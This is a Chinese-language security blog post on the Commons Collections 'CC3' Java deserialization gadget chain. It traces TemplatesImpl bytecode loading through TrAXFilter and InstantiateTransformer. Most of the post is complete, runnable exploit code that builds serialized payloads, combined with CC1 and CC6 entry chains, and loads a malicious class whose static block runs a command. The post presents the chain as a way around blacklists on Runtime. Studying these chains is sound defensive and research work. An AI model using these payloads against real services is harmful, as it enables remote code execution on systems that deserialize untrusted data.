---
title: java反序列化之CC3
date: 2026-05-14
tags: 
  - java安全
  - 反序列化专题
  - CC链
categories: 
  - web安全
  - java安全
excerpt: java反序列化之CC3
---

# java反序列化之CC3

## CC3 简介

CC3 和之前的 CC1 和 CC6 有很大区别，CC1 和 CC6 是通过`Runtime.exec()`进行命令执行的，很多时候代码中会 ban 了`Runtime`。

而在 CC3 中，是通过动态类加载机制实现自动执行**恶意类代码**的。

下面再回顾以下 java 动态类加载机制。

## TemplatesImpl 解析

在我之前动态类加载的博客中有讲过利用`ClassLoader#defineClass`直接加载字节码的方法。在这一条链子中，简单说就是调用`ClassLoader.loadClass()`，然后会调用`ClassLoader.findClass()`，然后会调用`ClassLoader.defineClass()`。

这里从正向看这个链子，首先`loadClass()`，作用是从已加载的类缓存、父加载器等位置寻找类（即双亲委派机制），在前面没有找到的情况下执行`findClass()`。`findClass()`这个方法根据名称或位置加载 class 字节码，然后调用`defineClass()`。`findClass()`这个方法通常会由子类实现。

`defineClass()`的作用是处理前面传入的字节码，把字节码转化成真正的 java 类。而此时的`defineClass()`是有局限性的，因为只加载类，并不执行类。若需要执行，则需要先进行`newInstance()`实例化。

`ClassLoader`的`defineClass()`方法的作用域为`protected`，我们需要找到作用域为`public`的类方便使用。

在`TemplatesImpl`类的静态内部类`TransletClassLoader`中找到了我们能够运用的`defineClass`。

```java
Class defineClass(final byte[] b) {
            return defineClass(null, b, 0, b.length);
        }
```

这里的`defineClass()`没有标注作用域，默认为包级私有，在自己的类里可以调用。继续查找用法。

在`TemplatesImpl`的`defineTransletClasses`方法中找到了调用，这个方法是私有的，找一下谁调用了`defineTransletClasses`。

还是同一个类下的`getTransletInstance()`方法调用了`defineTransletClasses`：

```java
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();  //调用点

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

这里同时还有一个`newInstance()`实例化的过程，如果能走完这个函数就能动态执行代码，但是因为是私有的，得继续找。

同一个类下的`newTransformer()`方法中调用了`getTransletInstance()`方法：

```java
public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
```

这是一个公有方法，接下来开始利用。

## TemplatesImpl 利用

上面我们分析过，只要能走到`getTransletInstance()`方法即可，因为内部调用了`newInstance()`方法，接下来只要满足一系列限制条件就能利用。

下面先把利用链写出来，然后对着利用链逐条满足限制：

```text
TemplatesImpl#newTransformer() ->

TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()

-> TransletClassLoader#defineClass()
```

首先是`getTransletInstance()`方法：

```java
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

`_name`不能为空，同时`_class`为空。看一下这两个属性是什么：

```java
private String _name = null;

private Class[] _class = null;
```

所以在利用的时候一定要先反射调用给`_name`赋值；而`_class`的作用是用来存放已加载的类，防止重复加载，默认值是`null`，对于一个新的`TemplatesImpl`实例来说，首次调用一定会触发`defineTransletClasses()`。

然后到`defineTransletClasses()`方法里看一下：

```java
private void defineTransletClasses()
        throws TransformerConfigurationException {

        if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });

        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new HashMap<>();
            }

            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }

            if (_transletIndex < 0) {
                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            }
        }
        catch (ClassFormatError e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (LinkageError e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

```java
private byte[][] _bytecodes = null;
```

这里的`_bytecodes`的值要是一个二维数组，所以我们可以创建一个二维数组。但是`_bytecodes`作为参数传递给`defineClass`的值是一个一维数组，而这个一维数组里面要存放我们构造的恶意字节码。我们先构造一个 poc。

```java
package org.example.Calc;

import java.io.IOException;

public class Calc {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

把它编译一下，然后我们读取到`byte[]`中去：

```java
byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC3\\src\\main\\java\\org\\example\\Calc\\Calc.class"));
byte[][] code={evil};
```

回顾以下上面的源码，判断`_bytecodes`不是`null`后，就会进入下一步：自定义类加载器。

```java
TransletClassLoader loader = (TransletClassLoader)
	AccessController.doPrivileged(new PrivilegedAction() {
		public Object run() {
			return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
		}
	});
```

这个自定义类加载器的`TransletClassLoader`类型的，也是在上面解析部分讲过的链尾，继承于`ClassLoader`。来看一下这段代码中的参数：

`ObjectFactory.findClassLoader()`这是`ObjectFactory`类调用了`findClassLoader()`静态方法，不需要关注。

`_tfactory.getExternalExtensionsMap()`中的`_tfactory`的定义为`private transient TransformerFactoryImpl _tfactory = null;`，这个参数用`transient`修饰了，不会被序列化，无法直接修改。虽然在利用的过程没有攻击的意义，但是这个`_tfactory`不能为`null`，否则无法走到`defineClass`这一步。

接下来找找`_tfactory`其他定义。

在`readObject()`方法中，找到了`_tfactory`的初始化定义：

```java
private void  readObject(ObjectInputStream is)
      throws IOException, ClassNotFoundException
    {
        SecurityManager security = System.getSecurityManager();
        if (security != null){
            String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);
            if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase("true"))) {
                ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR);
                throw new UnsupportedOperationException(err.toString());
            }
        }

        // We have to read serialized fields first.
        ObjectInputStream.GetField gf = is.readFields();
        _name = (String)gf.get("_name", null);
        _bytecodes = (byte[][])gf.get("_bytecodes", null);
        _class = (Class[])gf.get("_class", null);
        _transletIndex = gf.get("_transletIndex", -1);

        _outputProperties = (Properties)gf.get("_outputProperties", null);
        _indentNumber = gf.get("_indentNumber", 0);

        if (is.readBoolean()) {
            _uriResolver = (URIResolver) is.readObject();
        }

        _tfactory = new TransformerFactoryImpl();  //在这！！！
    }
```

下面先使用目前的链子来构造一个初步的 exp：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class test {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class"));
        byte[][] code={evil};
        bytecodes.set(templates,code);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());
        
        templates.newTransformer();

    }
}

```

但是报错了，这是因为在`defineTransletClasses()`方法中还有非常重要的一步：父类检查。

```java
final Class superClass = _class[i].getSuperclass();

// Check if this is the main class
if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
    _transletIndex = i;
}
else {
    _auxClasses.put(_class[i].getName(), _class[i]);
}
```

这里会判断我们构造的恶意类是否是`ABSTRACT_TRANSLET`，即`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`这个类的子类。如果不是，则会跳出程序。

所以我们让恶意类继承`AbstractTranslet`类，或者给`_auxClasses`赋值使其不为`null`。

## CC1 链的 TemplatesImpl 实现方法

TemplatesImpl 只是将原本的命令执行变成代码执行的方式，所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。

所以在 CC1 链中只要把最后的命令执行方式修改一下就可以了。

初步的 exp：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;


import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class test {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class"));
        byte[][] code={evil};
        bytecodes.set(templates,code);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        //templates.newTransformer();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",new Class[0],new Object[0])
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(1);
    }
}
```

成功弹出计算器，接下来把 CC1 的前半段放进去：

```java
package org.example;

import com.sun.javafx.collections.MappingChange;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;


import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class"));
        byte[][] code={evil};
        bytecodes.set(templates,code);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        //templates.newTransformer();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",new Class[0],new Object[0])
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(1);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","abc");

        Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
        Class<?> aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aihConstructor = aih.getDeclaredConstructor(Class.class, Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Retention.class, transformedMap);

        serialize(o);
        unserialize("ser.bin");
    }
}
```

然后是 yso 版本的 TemplatesImpl 的实现方式。

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;


import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class"));
        byte[][] code={evil};
        bytecodes.set(templates,code);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        //templates.newTransformer();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",new Class[0],new Object[0])
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(1);

        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        Class<?> aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aihConstructor = aih.getDeclaredConstructor(Class.class, Map.class);
        aihConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) aihConstructor.newInstance(Retention.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler);

        invocationHandler = (InvocationHandler) aihConstructor.newInstance(Retention.class, proxyMap);

        serialize(invocationHandler);
        unserialize("ser.bin");
    }
}
```

## CC6 链的 TemplatesImpl 的实现方式

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC6test {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class"));
        byte[][] code={evil};
        bytecodes.set(templates,code);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        //templates.newTransformer();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",new Class[0],new Object[0])
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"value");
        lazyMap.remove("key");

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factory = lazyMapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);

        serialize(hashMap);
        unserialize("ser.bin");
    }
}
```

可以顺便回顾一下 CC1 和 CC6 的链子。

## CC3 链

### CC3 链分析

上面分析过，只要能调用到`TemplatesImpl`的`newTransformer()`方法，就可以实现命令执行，接下来找一下谁调用了`newTransformer()`方法。

在所有的查找结果中，`TrAXFilter`最好使。

虽然这个类没有实现`Serializable`接口，不能序列化，但是构造函数是有利用面的。

```java
public TrAXFilter(Templates templates)  throws
        TransformerConfigurationException
    {
        _templates = templates;
        _transformer = (TransformerImpl) templates.newTransformer();
        _transformerHandler = new TransformerHandlerImpl(_transformer);
        _useServicesMechanism = _transformer.useServicesMechnism();
    }
```

CC3 中没有调用`InvokerTransformer`，而是调用了另一个类`InstantiateTransformer`。

这个类是用来初始化`Transformer`的，我们看一下这个类下的`transform`方法：

```java
public Object transform(Object input) {
        try {
            if (input instanceof Class == false) {
                throw new FunctorException(
                    "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                        + (input == null ? "null object" : input.getClass().getName()));
            }
            Constructor con = ((Class) input).getConstructor(iParamTypes);
            return con.newInstance(iArgs);

        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
        } catch (InstantiationException ex) {
            throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
        }
    }
```

### 构造 EXP

后半段的命令执行是不变的，也就是`TemplatesImpl`部分的 EXP 是不变的。

先看一下后半段的 EXP：

```java
package org.example.CC3serial;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class CC3serialize {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();

        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class"));
        byte[][] codes={evil};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        instantiateTransformer.transform(TrAXFilter.class);

    }
}
```

后半部分的 EXP 写好了，接下来去找入口类的前半部分，而前半部分是从谁调用了`transform`方法开始，所以 CC1 和 CC6 前半部分 EXP 都是有效的。

#### CC1 作为前半段

```java
package org.example.CC3serial;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3serialize {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();

        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class"));
        byte[][] codes={evil};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        //instantiateTransformer.transform(TrAXFilter.class);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        Class<?> aih = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> aihConstructor = aih.getDeclaredConstructor(Class.class, Map.class);
        aihConstructor.setAccessible(true);
        InvocationHandler invocationhandler = (InvocationHandler) aihConstructor.newInstance(Retention.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationhandler);

        Object o = aihConstructor.newInstance(Retention.class, proxyMap);

        serialize(o);
        unserialize("ser.bin");
    }
}
```

#### CC6 作为前半部分

```java
package org.example.CC6serial;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC6serialize {

    public static void serialize(Object obj) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();

        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"abc");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("C:\\Users\\32202\\Desktop\\CC3\\target\\classes\\org\\example\\calcEXP\\Calc.class"));
        byte[][] codes={evil};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        //instantiateTransformer.transform(TrAXFilter.class);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
        HashMap<Object, Object> serialMap = new HashMap<>();
        serialMap.put(tiedMapEntry,"value");
        lazyMap.remove("key");

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factory = lazyMapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);

        serialize(serialMap);
        unserialize("ser.bin");
    }
}
```

## 总结

CC3 主要是另外一种命令执行的方式，能绕过黑名单。利用链主要就是和 CC1、CC6 区别不大，根据 CC1 和 CC6 的思路进行一下微调即可。































